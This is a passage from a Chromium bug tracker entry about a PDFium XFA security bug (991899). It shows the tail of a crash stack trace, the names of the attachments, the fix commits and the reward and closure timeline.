\*\*\* WARNING: Unable to verify checksum for C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\out\chromium_pdfium_xfa\embedder.dll  
4f 00eff180 354a22e1 content!content::ContentServiceManagerMainDelegate::RunEmbedderProcess(void)+0x30 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\content\app\content_service_manager_main_delegate.cc @ 52]   
50 00eff500 5fbdacdc embedder!service_manager::Main(struct service_manager::MainParams \* params = 0x00eff524)+0x6d1 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\services\service_manager\embedder\main.cc @ 423]   
51 00eff54c 169d1315 content!content::ContentMain(struct content::ContentMainParams \* params = 0x00eff5c4)+0x5c [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\content\app\content_main.cc @ 20]   
52 00eff628 00ab8e33 chrome!ChromeMain(struct HINSTANCE__ \* instance = 0x00ab0000, struct sandbox::SandboxInterfaceInfo \* sandbox_info = 0x00eff6bc, int64 exe_entry_point_ticks = 0n92325426623)+0x1f5 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\chrome\app\chrome_main.cc @ 110]   
53 00eff720 00ab147f chrome_exe!MainDllLoader::Launch(struct HINSTANCE__ \* instance = 0x00ab0000, class base::TimeTicks exe_entry_point_ticks = class base::TimeTicks)+0x453 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\chrome\app\main_dll_loader_win.cc @ 202]   
54 00effa00 00ce6efe chrome_exe!wWinMain(struct HINSTANCE__ \* instance = 0x00ab0000, struct HINSTANCE__ \* prev = 0x00000000)+0x47f [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\chrome\app\chrome_exe_main_win.cc @ 234]   
55 00effa18 00ce7051 chrome_exe!invoke_main(void)+0x1e [f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl @ 123]   
56 00effa70 00ce711d chrome_exe!__scrt_common_main_seh(void)+0x151 [f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl @ 283]   
57 00effa78 00ce7128 chrome_exe!__scrt_common_main(void)+0xd [f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl @ 326]   
58 00effa80 74d90419 chrome_exe!wWinMainCRTStartup(void)+0x8 [f:\dd\vctools\crt\vcstartup\src\startup\exe_wwinmain.cpp @ 17]   
59 00effa90 7774662d KERNEL32!BaseThreadInitThunk+0x19  
5a 00effaec 777465fd ntdll!__RtlUserThreadStart+0x2f  
5b 00effafc 00000000 ntdll!_RtlUserThreadStart+0x1b  

```

## Attachments

- [poc.pdf](attachments/poc.pdf) (application/pdf, 8.0 KB)
- [crash_info.txt](attachments/crash_info.txt) (text/plain, 30.4 KB)

## Timeline

### ke...@chromium.org (2019-08-09)

Thanks for the detailed description. Assigning to tsepez@ for assessment.

[Monorail components: Internals>Plugins>PDF]

### bu...@chops-service-accounts.iam.gserviceaccount.com (2019-08-15)

The following revision refers to this bug:
  https://pdfium.googlesource.com/pdfium/+/b9c940d699f6f893efe6a8a479b2b7934cde4b02

commit b9c940d699f6f893efe6a8a479b2b7934cde4b02
Author: Tom Sepez <tsepez@chromium.org>
Date: Thu Aug 15 16:57:41 2019

Observe pNewWidget across OnKillFocus

Bug: chromium:991899
Change-Id: Ieb1ab9bc3c14372d5b7e107f299cf161837bb3f6
Reviewed-on: https://pdfium-review.googlesource.com/c/pdfium/+/59350
Reviewed-by: Lei Zhang <thestig@chromium.org>
Commit-Queue: Tom Sepez <tsepez@chromium.org>

[modify] https://pdfium.googlesource.com/pdfium/+/b9c940d699f6f893efe6a8a479b2b7934cde4b02/xfa/fxfa/cxfa_ffwidget.cpp
[add] https://pdfium.googlesource.com/pdfium/+/b9c940d699f6f893efe6a8a479b2b7934cde4b02/testing/resources/javascript/xfa_specific/bug_991899_expected.txt
[add] https://pdfium.googlesource.com/pdfium/+/b9c940d699f6f893efe6a8a479b2b7934cde4b02/testing/resources/javascript/xfa_specific/bug_991899.in


### bu...@chops-service-accounts.iam.gserviceaccount.com (2019-08-15)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/b1a7675a9ca7ba8489f47243c410a0468028b820

commit b1a7675a9ca7ba8489f47243c410a0468028b820
Author: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Date: Thu Aug 15 22:50:12 2019

Roll src/third_party/pdfium 8b351b9d4749..d3e3a4051984 (6 commits)

https://pdfium.googlesource.com/pdfium.git/+log/8b351b9d4749..d3e3a4051984

git log 8b351b9d4749..d3e3a4051984 --date=short --no-merges --format='%ad %ae %s'
2019-08-15 thestig@chromium.org Fix nits in Harness() in a Skia test.
2019-08-15 tsepez@chromium.org Replace PDF_ENABLE_XFA with an interface in CFXJS_Engine.
2019-08-15 asweintraub@google.com Fix ClangTidy warning.
2019-08-15 tsepez@chromium.org Remove some CXFA_FFWidget usage from fpdfsdk.
2019-08-15 tsepez@chromium.org Observe m_pFocusWidget across m_ArrayKeepItems.clear()
2019-08-15 tsepez@chromium.org Observe pNewWidget across OnKillFocus

Created with:
  gclient setdep -r src/third_party/pdfium@d3e3a4051984

The AutoRoll server is located here: https://autoroll.skia.org/r/pdfium-autoroll

Documentation for the AutoRoller is here:
https://skia.googlesource.com/buildbot/+/master/autoroll/README.md

If the roll is causing failures, please contact the current sheriff, who should
be CC'd on the roll, and stop the roller if necessary.


TBR=pdfium-deps-rolls@chromium.org

Bug: chromium:993771,chromium:991899
Change-Id: Ib1964318dc2d27b34b0b5856bc40f5eb67b5345c
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/1756810
Reviewed-by: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Cr-Commit-Position: refs/heads/master@{#687458}

[modify] https://crrev.com/b1a7675a9ca7ba8489f47243c410a0468028b820/DEPS


### ts...@chromium.org (2019-08-22)

[Empty comment from Monorail migration]

### hu...@gmail.com (2020-01-07)

Hi guys, 

This issue is totally fixed :D can you close this plz? :D

### ts...@chromium.org (2020-01-07)

[Empty comment from Monorail migration]

### ts...@chromium.org (2020-01-07)

Looks like this should have been marked fixed some time ago.  Thanks for the reminder.

### sh...@chromium.org (2020-01-08)

[Empty comment from Monorail migration]

### th...@chromium.org (2020-01-08)

Whoops, looks like we lost track of this one.

### na...@google.com (2020-01-14)

[Empty comment from Monorail migration]

### na...@google.com (2020-01-23)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### na...@google.com (2020-01-23)

Congrats the Panel decided to reward $7,500 for this report!

### na...@google.com (2020-01-23)

[Empty comment from Monorail migration]

### [Deleted User] (2020-04-14)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2020-04-14)

This issue was migrated from crbug.com/chromium/991899?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40095935)*
